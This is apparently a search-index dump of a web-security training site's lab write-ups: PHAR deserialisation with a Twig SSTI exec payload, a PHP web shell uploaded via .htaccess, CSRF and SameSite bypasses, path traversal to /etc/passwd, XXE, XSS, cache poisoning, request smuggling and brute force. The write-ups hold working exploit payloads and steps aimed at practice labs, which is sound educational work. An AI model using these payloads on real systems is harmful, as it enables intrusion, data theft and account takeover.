Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6113c4d5cc77abcde799eb4a5f00d47",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/10",
    "t": "Using PHAR deserialisation to deploy a custom gadget chain ",
    "c": "Using PHAR deserialisation to deploy a custom gadget chain  Description  This lab does not explicitly use deserialisation. However, if you combine PHAR deserialisation with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain. Reproduction and proof of concept  The website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. It is loaded using GET /cgi-bin/avatar.php?avatar=wiener . In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file. Obtain the source code by requesting the files using the .php~ backup extension. Blog.php : <?php require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php'); class Blog { public $user; public $desc; private $twig; public function __construct($user, $desc) { $this->user = $user; $this->desc = $desc; } public function __toString() { return $this->twig->render('index', ['user' => $this->user]); } public function __wakeup() { $loader = new Twig_Loader_Array([ 'index' => $this->desc, ]); $this->twig = new Twig_Environment($loader); } public function __sleep() { return [\"user\", \"desc\"]; } } ?> CustomTemplate.php : <?php class CustomTemplate { private $template_file_path; public function __construct($template_file_path) { $this->template_file_path = $template_file_path; } private function isTemplateLocked() { return file_exists($this->lockFilePath()); } public function getTemplate() { return file_get_contents($this->template_file_path); } public function saveTemplate($template) { if (!isTemplateLocked()) { if (file_put_contents($this->lockFilePath(), \"\") === false) { throw new Exception(\"Could not write to \" . $this->lockFilePath()); } if (file_put_contents($this->template_file_path, $template) === false) { throw new Exception(\"Could not write to \" . $this->template_file_path); } } } function __destruct() { // Carlos thought this would be a good idea @unlink($this->lockFilePath()); } private function lockFilePath() { return 'templates/' . $this->template_file_path . '.lock'; } } ?> Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes. The file_exists() filesystem method is called on the lockFilePath attribute. Notice that the website uses the Twig template engine. You can use deserialisation to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig , and adapt it to delete Carlos’s file: {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}} Write some PHP for creating a CustomTemplate and Blog containing the SSTI payload: class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog = new Blog; $blog->desc = '{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}}'; $blog->user = 'user'; $object->template_file_path = $blog; Create a phar-jpg polyglot containing the PHP script. Upload this file as your avatar. In Burp Repeater, modify the request line to deserialise your malicious avatar using a phar:// stream as follows: GET /cgi-bin/avatar.php?avatar=phar://wiener Send the request to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; and delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "00bf4421a95b0821052eeb74fa7c8dbe",
    "u": "https://webapp.tymyrddin.dev/docs/upload/4",
    "t": "Web shell upload via extension blacklist bypass ",
    "c": "Web shell upload via extension blacklist bypass  Description  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. Reproduction and proof of concept  Log in and upload an image as your avatar, then go back to your account page. In Burp, go to Proxy -> HTTP history and notice that the image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos’s secret. For example: <?php echo file_get_contents('/home/carlos/secret'); ?> Attempt to upload this script as your avatar. The response indicates that you are not allowed to upload files with a .php extension. Sorry, php files are not allowed Sorry, there was an error uploading your file. � Back to My Account In Burp’s proxy history, find the POST /my-account/avatar request that was used to submit the file upload. In the response, notice that the headers reveal that you’re talking to an Apache server. Send this request to Burp Repeater. In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to the PHP file. Make the following changes: Change the value of the filename parameter to .htaccess . Change the value of the Content-Type header to text/plain . Replace the contents of the file (your PHP payload) with the following Apache directive: AddType application/x-httpd-php .l33t This maps an arbitrary extension ( .l33t ) to the executable MIME type application/x-httpd-php . As the server uses the mod_php module, it knows how to handle this already. Send the request and observe that the file was successfully uploaded. Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit. Change the value of the filename parameter from exploit.php to exploit.l33t . Send the request again and notice that the file was uploaded successfully. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.l33t and send the request. Carlos’s secret was returned in the response. Thanks to the malicious .htaccess file, the .l33t file was executed as if it were a .php file. Submit the secret to solve the lab. Exploitability  An attacker will need to log in; upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret ; and then enter this secret using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7c76787320856769420e410144076a30",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/sql-authentication",
    "t": "SQL injection: authentication ",
    "c": "SQL injection: authentication  root-me challenge: Authentication v 0.01 : Retrieve the administrator password. username: admin'-- Resources  Injection SQL Blackhat Europe 2009 - Advanced SQL injection whitepaper Guide to PHP security : chapter 3 SQL injection Blackhat US 2006 : SQL Injections by truncation Manipulating SQL server using SQL injection",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "37ed5f30d972960756e2fbe9f457765a",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/7",
    "t": "SameSite Lax bypass via method override ",
    "c": "SameSite Lax bypass via method override  Description  This lab ’s change email function is vulnerable to CSRF. Reproduction and proof of concept  Study the change email function  In Burp’s browser, log in to the wiener account and change the email address. In Burp, go to the Proxy -> HTTP history tab. Study the POST /my-account/change-email request and notice that this doesn’t contain any unpredictable tokens, so it may be vulnerable to CSRF if you can bypass the SameSite cookie restrictions. Look at the response to the POST /login request. Notice that the website doesn’t explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level. This means the session cookie will be sent in cross-site GET requests, as long as they involve a top-level navigation. Bypass the SameSite restrictions  Send the POST /my-account/change-email request to Burp Repeater. In Burp Repeater, right-click on the request and select Change request method . Burp automatically generates an equivalent GET request. Send the request. The endpoint only allows POST requests. Try overriding the method by adding the _method parameter to the query string: GET /my-account/change-email?email=oioioi%40web-security-academy.net&_method=POST HTTP/1.1 Send the request. This seems to have been accepted by the server. In the browser, go to the “MyAccount” page and confirm that the email address has changed. Craft an exploit  In the browser, go to the exploit server. In the Body section, create an HTML/JavaScript payload that induces the viewer’s browser to issue the malicious GET request. This must cause a top-level navigation in order for the session cookie to be included: <script> document.location = \"https://0a4d0003036b19ecc578289c00c700e6.web-security-academy.net/my-account/change-email?email=evil@web-security-academy.net&_method=POST\"; </script> Store and view the exploit yourself. Confirm that this has successfully changed the email address on the target site. Deliver the exploit to the victim to solve the lab. Exploitability  An attacker needs to have an account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "edc85bc2f5beae4a3d36f5d83023ce6f",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/4",
    "t": "File path traversal, traversal sequences stripped with superfluous URL-decode ",
    "c": "File path traversal, traversal sequences stripped with superfluous URL-decode  Description  This lab contains a file path traversal vulnerability in the display of product images. The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that fetches a product image. Modify the filename parameter, giving it the value: ..%252f..%252f..%252fetc/passwd The response contains the contents of the /etc/passwd file: Exploitability  An attacker will need to encode the payload to retrieve the contents of the /etc/passwd file",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b6d1881949238b0774b348fb59087d81",
    "u": "https://webapp.tymyrddin.dev/docs/auth/7",
    "t": "Username enumeration via account lock ",
    "c": "Username enumeration via account lock  Description  This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. Reproduction and proof of concept  With Burp running, investigate the login page and submit an invalid username and password. Send the POST /login request to Burp Intruder. Select the attack type Cluster bomb. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add § twice. The result should look something like this: On the Payloads tab, add the list of usernames to the first payload set. For the second set, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts . Make a note of this username. Create a new Burp Intruder attack on the POST /login request, but this time select the Sniper attack type. Set the username parameter to the username that you just identified and add a payload position to the password parameter. Add the list of passwords to the payload set and create a grep extraction rule for the error message “Invalid username or password”. Start the attack. In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password. Wait for a minute to allow the account lock to reset. Log in using the username and password that identified and access the user account page to solve the lab. Exploitability  An attacker will need to enumerate a valid username , brute-force this user’s password , then access their account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a36adbb0c559235c20646aaa0be59eeb",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/11",
    "t": "CSRF where Referer validation depends on header being present ",
    "c": "CSRF where Referer validation depends on header being present  Description  This lab ’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback. Reproduction and proof of concept  Open Burp’s browser and log in to your account. Submit the “Update email” form, and find the resulting request in your Proxy history. Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected. Delete the Referer header entirely and observe that the request is now accepted. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above). Include the following HTML to suppress the Referer header: <meta name=\"referrer\" content=\"no-referrer\"> Store the exploit, then click Deliver to victim . Exploitability  An attacker needs to have an account and use an exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c004a9950b954bcfd5efdeed37a52303",
    "u": "https://webapp.tymyrddin.dev/docs/auth/13",
    "t": "Broken brute-force protection, multiple credentials per request ",
    "c": "Broken brute-force protection, multiple credentials per request  Description  This lab is vulnerable due to a logic flaw in its brute-force protection. Reproduction and proof of concept  With Burp running, investigate the login page. Notice that the POST /login request submits the login credentials in JSON format. Send this request to Burp Repeater. In Burp Repeater, replace the single string value of the password with an array of strings containing all candidate passwords. For example: { \"username\":\"carlos\", \"password\" : [ \"123456\", \"password\", \"12345678\", \"qwerty\", \"123456789\", \"12345\", \"1234\", \"111111\", \"1234567\", \"dragon\", \"123123\", \"baseball\", \"abc123\", \"football\", \"monkey\", \"letmein\", \"shadow\", \"master\", \"666666\", \"qwertyuiop\", \"123321\", \"mustang\", \"1234567890\", \"michael\", \"654321\", \"superman\", \"1qaz2wsx\", \"7777777\", \"121212\", \"000000\", \"qazwsx\", \"123qwe\", \"killer\", \"trustno1\", \"jordan\", \"jennifer\", \"zxcvbnm\", \"asdfgh\", \"hunter\", \"buster\", \"soccer\", \"harley\", \"batman\", \"andrew\", \"tigger\", \"sunshine\", \"iloveyou\", \"2000\", \"charlie\", \"robert\", \"thomas\", \"hockey\", \"ranger\", \"daniel\", \"starwars\", \"klaster\", \"112233\", \"george\", \"computer\", \"michelle\", \"jessica\", \"pepper\", \"1111\", \"zxcvbn\", \"555555\", \"11111111\", \"131313\", \"freedom\", \"777777\", \"pass\", \"maggie\", \"159753\", \"aaaaaa\", \"ginger\", \"princess\", \"joshua\", \"cheese\", \"amanda\", \"summer\", \"love\", \"ashley\", \"nicole\", \"chelsea\", \"biteme\", \"matthew\", \"access\", \"yankees\", \"987654321\", \"dallas\", \"austin\", \"thunder\", \"taylor\", \"matrix\", \"mobilemail\", \"mom\", \"monitor\", \"monitoring\", \"montana\", \"moon\", \"moscow\" ] } Send the request. This will return a 302 response. Right-click on this request and select Show response in browser . Copy the URL and load it in the browser. The page loads and you are logged in as carlos. Click My account to access Carlos’s account page and solve the lab. Exploitability  An attacker will need to brute-force Carlos’s password, then access his account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e2a77b9847c8a4df214a3845769502cf",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/4",
    "t": "SSRF with filter bypass via open redirection vulnerability ",
    "c": "SSRF with filter bypass via open redirection vulnerability  Description  This lab has a stock check feature which fetches data from an internal system. Reproduction and proof of concept  Visit a product, click Check stock , intercept the request in Burp Suite, and send it to Burp Repeater. Click next product (on the site) and send that to Repeater also. Try tampering with the stockApi parameter of the first intercepted request and observe that it isn’t possible to make the server issue the request directly to a different host. For the next product request observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection . Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the stockApi parameter on the stock checker: Observe that the stock checker follows the redirection and shows you the admin page. Amend the path to delete the target user: Exploitability  An attacker will need to change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos . The stock checker has been restricted to only access the local application, so the attacker will need to find an open redirect affecting the application first.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a8a6a832ba3a66a4158c2d966d2dc06",
    "u": "https://webapp.tymyrddin.dev/docs/cache/6",
    "t": "Web cache poisoning via an unkeyed query parameter ",
    "c": "Web cache poisoning via an unkeyed query parameter  Description  This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site’s home page using Chrome. Reproduction and proof of concept  Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response. Add a cache-buster query parameter. Use Param Miner’s Guess GET parameters feature to identify that the parameter utm_content is supported by the application. Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string. Send a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload: GET /?utm_content='/><script>alert(1)</script> Once your payload is cached, remove the utm_content parameter, right-click on the request, and select “Copy URL”. Open this URL in your browser and check that the alert() is triggered when you load the page. Remove your cache buster, re-add the utm_content parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page Exploitability  An attacker will need to poison the cache with a response that executes alert(1) in the victim’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a4eb3463bf1078b267b8868f8d412381",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/10",
    "t": "SameSite Lax bypass via cookie refresh ",
    "c": "SameSite Lax bypass via cookie refresh  Description  This lab ’s change email function is vulnerable to CSRF . Running out of time, I chose a shortcut for this lab. :) Reproduction and proof of concept  Study the change email function  In Burp’s browser, log in via your social media account and change your email address. In Burp, go to the Proxy -> HTTP history tab. Study the POST /my-account/change-email request and notice that this doesn’t contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions. Look at the response to the GET /oauth-callback?code=[...] request at the end of the OAuth flow. Notice that the website doesn’t explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level. Attempt a CSRF attack  From the POST /my-account/change-email request in Repeater, create a PoC: Copy/paste it in the body of the exploit server. Replace the: <script>history.pushState('', '', '/')</script> With: <script> window.onclick = () => { window.open(\"\") } </script> In the POST /my-account/change-email request in Repeater, right-click and Copy URL . Paste the URL in the window(\"\") . The exploit now looks like: Store and Deliver to victim . Exploitability  An attacker needs to have a social media account and use an exploit server to host the attack. The lab supports OAuth-based login, and the attacker can log in via a social media account with credentials: wiener:peter .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1c5f2370877bca21de4720530ad73835",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/7",
    "t": "Exploiting XInclude to retrieve files ",
    "c": "Exploiting XInclude to retrieve files  Description  This lab has a “Check stock” feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don’t control the entire XML document you can’t define a DTD to launch a classic XXE attack. Reproduction and proof of concept  Visit a product page, click Check stock , and intercept the resulting POST request in Burp Suite. Set the value of the productId parameter to: <foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo> Send: Exploitability  An attacker needs to inject an XInclude statement to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6af92a0b49be2e02133c39fd86f466ec",
    "u": "https://webapp.tymyrddin.dev/docs/xss/11",
    "t": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded ",
    "c": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded  Description  The website in this lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality. AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded. Reproduction and proof of concept  Enter an alphanumeric string into the search box. View the page source and observe that your random string is enclosed in an ng-app directive. <body ng-app=\"\" class=\"ng-scope\"> ... </body> Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}} Click search.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "52904967a69295cd6501c696efaa28aa",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/10",
    "t": "Exploiting HTTP request smuggling to deliver reflected XSS ",
    "c": "Exploiting HTTP request smuggling to deliver reflected XSS  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header. Reproduction and proof of concept  Visit a blog post, and send the request to Burp Repeater. Observe that the comment form contains your User-Agent header in a hidden input. < form action = \"/post/comment\" method = \"POST\" enctype = \"application/x-www-form-urlencoded\" > < input required type = \"hidden\" name = \"csrf\" value = \"ajcJ7sBhu11O59fftA4J4p3r8IYcFR0x\" > < input required type = \"hidden\" name = \"userAgent\" value = \"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\" > < input required type = \"hidden\" name = \"postId\" value = \"10\" > < label > Comment: </ label > < textarea required rows = \"12\" cols = \"300\" name = \"comment\" ></ textarea > < label > Name: </ label > < input required type = \"text\" name = \"name\" > < label > Email: </ label > < input required type = \"email\" name = \"email\" > < label > Website: </ label > < input pattern = \"(http:|https:).+\" type = \"text\" name = \"website\" > < button class = \"button\" type = \"submit\" > Post Comment </ button > </ form > Inject an XSS payload into the User-Agent header and observe that it gets reflected: \"/><script>alert(1)</script> Smuggle this XSS request to the back-end server, so that it exploits the next visitor: Exploitability  An attacker will need to smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "36411ac6b4dfc2d1e7171f670c00d174",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/business",
    "t": "Application logic errors ",
    "c": "Application logic errors  Application (business) logic errors are a different beast. These are not about patterns. Developers take decisions in the code, and after processing them, they have a result. When they do that, they think about just the possible options they have from design. Finding logic bugs and not just security bugs is hard using static analysis or automated tools, and if testing is done from the application’s design paradigms, the fails are never detected. Options outside the chosen paradigms were not thought of. Attackers might. Steps  Try to understand how the application works using an HTTP proxy. Focus on the variables and parameters that could be used to control the application’s flow. Use automated tools for port scanning, vulnerability assessments, and configuration management issues. Intercept requests while browsing the application and pay attention to sensitive functionalities. Keep track of every request sent during these actions. Replicate previous vulnerabilities between applications. Use your creativity to think of ways to interfere with application logic. Think of ways to combine the vulnerability you’ve found with other vulnerabilities to maximize the potential impact of the flaw. Draft the report. Learn about the target  Start by learning about your target application. Browse the application as a regular user to uncover functionalities and interesting features. You can also read the application’s engineering blogs and documentation. The more you understand about the architecture, development process, and business needs of that application, the better you will be at spotting these vulnerabilities. Intercept requests while browsing  Intercept requests while browsing the site and pay attention to sensitive functionalities. Keep track of every request sent during these actions. Take note of how sensitive functionalities and access control are implemented, and how they interact with client requests. Think outside the box  Use your creativity to think of ways to bypass access control or otherwise interfere with application logic. Play with the requests that you have intercepted and craft requests that should not be granted. Escalation  Escalating application logic errors depends entirely on the nature of the flaw you find. But a general rule of thumb is that you can try to combine the application logic error or broken access control with other vulnerabilities to increase their impact. If you can find the configuration files of a web application, you can search for CVEs for the software versions in use to further compromise the application. Think of ways malicious users can exploit these vulnerabilities to the fullest extent, and communicate their impact in detail in the report. Portswigger lab writeups  Excessive trust in client-side controls High-level logic vulnerability Inconsistent security controls Flawed enforcement of business rules Low-level logic flaw Inconsistent handling of exceptional input Weak isolation on dual-use endpoint Insufficient workflow validation Authentication bypass via flawed state machine Infinite money logic flaw Authentication bypass via encryption oracle Remediation  Everybody involved in developing the software needs to understand the domain that the application serves. Avoid making implicit assumptions about user behaviour or the behaviour of other parts of the application. Assess the codebase to understand the business rules and logic of the application and identify the security controls in place, how they work, and any control gaps. Identify assumptions made about server-side states and implement the logic to verify that these assumptions are met. This includes verifying the value of any input makes sense before proceeding. Maintain clear design documents and data flows for all transactions and workflows, noting any assumptions that are made at each stage. If it is difficult to understand what is supposed to happen, it will be difficult to spot any logic flaws. In unavoidably complex cases, producing clear documentation is essential to ensure that other developers and testers know what assumptions are being made and exactly what the expected behaviour is. Note any references to other code that uses each component. Think about any side effects of these dependencies if a malicious party were to manipulate them in an unusual way. Resources  CWE CATEGORY: Business Logic Errors Portswigger: Business logic vulnerabilities OWASP: Business logic vulnerability Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "68eb29b064c331730fca8d504a7c9aec",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/1",
    "t": "Modifying serialised objects ",
    "c": "Modifying serialised objects  Description  This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. Reproduction  Log in using wiener:peter . Notice that the post-login GET /my-account request contains a session cookie that appears to be URL and Base64-encoded. Use Burp’s Inspector panel to study the request in its decoded form. The cookie is a serialised PHP object. The admin attribute contains b:0 , indicating the boolean value false. Send this request to Burp Repeater. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin attribute to b:1 . Click Apply changes . The modified object will automatically be re-encoded and updated in the request. Send the request. The response now contains a link to the admin panel at /admin , indicating that the page was accessed with admin privileges. Change the path of the request to /admin and resend it. The /admin page contains links to delete specific user accounts. Change the path of the request to /admin/delete?username=carlos and send the request to solve the lab. PoC  Exploitability  An attacker will need to log in; edit the serialised object in the session cookie to exploit this vulnerability and gain administrative privileges; and then delete Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a215dbcf5e9ff780c6e2d4814146b4a8",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/12",
    "t": "H2.CL request smuggling ",
    "c": "H2.CL request smuggling  I just spent 30 minutes wasting my time clicking a send button every 10 seconds without resolving the lab. Cam back to it two weeks later, and got it to solve. It can take a long time. Description  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Reproduction and proof of concept  From the Repeater menu, enable the Allow HTTP/2 ALPN override option and disable the Update Content-Length option. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows. Expand the Inspector’s Request Attributes section and change the protocol to HTTP/2 before sending the request. POST / HTTP/2 Host: lab-id.web-security-academy.net Content-Length: 0 SMUGGLED Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix. Using Burp Repeater, notice that if you send a request for GET /resources , you are redirected to https://lab-id.web-security-academy.net/resources/ . Create the following request to smuggle the start of a request for /resources , along with an arbitrary Host header: POST / HTTP/2 Host: lab-id.web-security-academy.net Content-Length: 0 GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1 Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host. Go to the exploit server and change the file path to /resources . In the body, enter the payload alert(document.cookie) , then store the exploit. In Burp Repeater, edit your malicious request so that the Host header points to your exploit server: POST / HTTP/2 Host: lab-id.web-security-academy.net Content-Length: 0 GET /resources HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net Content-Length: 5 x=1 Send the request a few times and confirm that you receive a redirect to the exploit server. Resend the request and wait for 10 seconds or so. Go to the exploit server and check the access log. If you see a GET /resources/ request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again. Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim’s browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won’t execute it. Exploitability  An attacker will need to perform a request smuggling attack that causes the victim’s browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie) . The victim user accesses the home page every 10 seconds. This lab requires Pro.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1bff5139ef0f976d15a9312c63452dfe",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/6",
    "t": "CSRF where token is duplicated in cookie ",
    "c": "CSRF where token is duplicated in cookie  Description  This lab ’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique. Reproduction and proof of concept  Open Burp’s browser and log in to your account. Submit the “Update email” form, and find the resulting request in your Proxy history. Send the request to Burp Repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie value. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, it can be used to inject cookies into the victim user’s browser. Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim’s browser: /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above), ensuring that your CSRF token is set to “fake”. The exploit should be created from the email change request. Remove the auto-submit script block and instead add the following code to inject the cookie: <img src=\"https://0a6500c504aae380c59e678d002000fb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None\" onerror=\"document.forms[0].submit();\"/> Copy HTML and put it in the body of the Exploit server form: Store the exploit, then click Deliver to victim . Exploitability  An attacker needs to use the exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address, and access to two accounts.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "376018fab54d5aaa6a1ffbebe0cd8959",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/1",
    "t": "File path traversal, simple case ",
    "c": "File path traversal, simple case  Description  This lab contains a file path traversal vulnerability in the display of product images. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that fetches a product image. Send to Repeater and modify the filename parameter, giving it the value: ../../../etc/passwd The response contains the contents of the /etc/passwd file: Exploitability  An attacker will need to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2dd642b51e400c8b3fd7da9b41c8a776",
    "u": "https://webapp.tymyrddin.dev/docs/cache/8",
    "t": "Web cache poisoning via a fat GET request ",
    "c": "Web cache poisoning via a fat GET request  Description  This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site’s home page using Chrome. Reproduction  Every page imports the script /js/geolocate.js , executing the callback function setCountryCookie() . Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater. It is possible to control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. The cache key is still derived from the original callback parameter in the request line: Request : GET /js/geolocate.js?callback=setCountryCookie … callback=arbitraryFunction Response : HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie … arbitraryFunction({\"country\" : \"United Kingdom\"}) Send the request again, but this time pass in alert(1) as the callback function. Check that you can successfully poison the cache. Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL. PoC  Exploitability  An attacker will need to poison the cache with a response that executes alert(1) in the victim’s browser using a fat GET request.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8e26c7bd256c94409a9322cba411cd91",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/csrf",
    "t": "Cross-site request forgery (CSRF) ",
    "c": "Cross-site request forgery (CSRF)  CSRF bugs can exist in GET or POST requests. Using one instead of the other is not a protection, but it requires a little more effort to exploit a POST request. To detect vulnerable GET requests, use the map created by the HTTP Proxy, and look for requests to methods in the application, internal or external. Use the img tag to test GET requests. Create forms to perform actions on vulnerable POST requests, using hidden fields to send the information required by the application. Cookies are vulnerable, so always take control of them in the client side. Although CSRF is normally described in relation to cookie-based session handling, it can also be done in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication. Pay special attention to APIs. Currently, nearly all developers want to construct service-oriented applications, and those are generally more susceptible to CSRF attacks. Steps  Look for relevant state-changing actions on the application and keep a note on their locations and functionality. Check these functionalities for CSRF protection. If you can not find any protections, you might have found a vulnerability. There are a lot of anti-CSRF protections, and most of them are included in the most-used web technologies. Avoid reinventing the wheel. If any CSRF protection mechanisms are present, try to bypass the protection. Confirm the vulnerability by crafting a malicious HTML page and visiting that page to see if the action has executed. Think of strategies for delivering the payload to end users. Draft the CSRF report Look for state-changing actions  Use the Site map tab in Burp or Zap, to detect when a resource is called to other domains. Log in to the target site and browse through it in search of any activity that alters data. Go through all the app’s functionalities, clicking all the links. Intercept the generated requests with a proxy like Burp or Zap, and write down their URL endpoints. Record these endpoints one by one, and include whether it is a POST or a GET , and the request parameters . Look for a lack of CSRF protections  Most security protection implemented to avoid attacks are based on csrf-tokens. The most frequently used development frameworks, such as Java Struts, .NET, Ruby on Rails, and PHP, include these tokens by default. And there are other methods, which can be bypassed. CSRF-unsafe protections  Secret cookies: Some developers include a cookie with a value to validate that the request received by the application comes from a valid place. But the main problem with the cookies is that they are stored in the client side, so it is possible to get them just by submitting a request using the web browser. These 